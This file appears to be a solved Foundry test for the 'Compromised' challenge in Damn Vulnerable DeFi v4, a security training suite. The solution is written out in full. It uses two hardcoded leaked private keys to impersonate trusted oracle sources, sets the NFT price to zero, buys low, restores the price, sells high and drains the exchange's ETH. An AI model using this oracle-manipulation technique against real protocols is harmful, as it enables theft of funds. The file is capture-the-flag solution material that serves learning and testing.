// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {VmSafe} from "forge-std/Vm.sol";

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";

contract CompromisedChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;

    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];
    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;

    modifier checkSolved() {
        _;
        _isSolved();
    }

    function setUp() public {
        startHoax(deployer);

        // Initialize balance of the trusted source addresses
        for (uint256 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Player starts with limited balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the oracle and setup the trusted sources with initial prices
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();

        // Deploy the exchange and get an instance to the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
        nft = exchange.token();

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        for (uint256 i = 0; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(nft.owner(), address(0)); // ownership renounced
        assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_compromised() public checkSolved {
        // 已知私钥
        uint256 pk1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
        uint256 pk2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;

        // 通过私钥推导出地址
        address addr1 = vm.addr(pk1);
        address addr2 = vm.addr(pk2);

        // 1. 伪造 trusted source 身份，调低价格
        vm.startPrank(addr1, addr1);
        oracle.postPrice("DVNFT", 0 wei);
        vm.stopPrank();

        vm.startPrank(addr2, addr2);
        oracle.postPrice("DVNFT", 0 wei);
        vm.stopPrank();

        // 确认价格已降低
        uint256 manipulatedPrice = oracle.getMedianPrice("DVNFT");
        console.log("Manipulated Price of DVNFT:", manipulatedPrice);

        // 2. 玩家以低价购买 NFT
        vm.startPrank(player, player);
        exchange.buyOne{value: 1 wei}();
        vm.stopPrank();

        // 确认玩家拥有 NFT (token ID 0)
        console.log("Player balance of DVNFT:", nft.balanceOf(player));

        // 3. 伪造 trusted source 身份，恢复价格
        vm.startPrank(addr1, addr1);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();

        vm.startPrank(addr2, addr2);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();

        // 确认价格已恢复
        uint256 restoredPrice = oracle.getMedianPrice("DVNFT");
        console.log("Restored Price of DVNFT:", restoredPrice);
        assertEq(restoredPrice, INITIAL_NFT_PRICE);

        // 4. 玩家以高价出售 NFT
        vm.startPrank(player, player);
        // 玩家需要先授权 exchange 合约转移其 NFT
        nft.approve(address(exchange), 0); // Token ID 0
        exchange.sellOne(0); // Token ID 0
        vm.stopPrank();
        console.log("Player balance: ", player.balance);
        
        // 5. 玩家将所有 ETH 转移到 recovery 账户
        vm.startPrank(player, player);
        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Exchange doesn't have ETH anymore
        assertEq(address(exchange).balance, 0, "Exchange should have 0 ETH");

        // ETH was deposited into the recovery account
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE, "Recovery account balance mismatch");

        // Player must not own any NFT
        assertEq(nft.balanceOf(player), 0, "Player should not own any NFT");

        // NFT price didn't change
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE, "NFT price should be restored");
    }
}
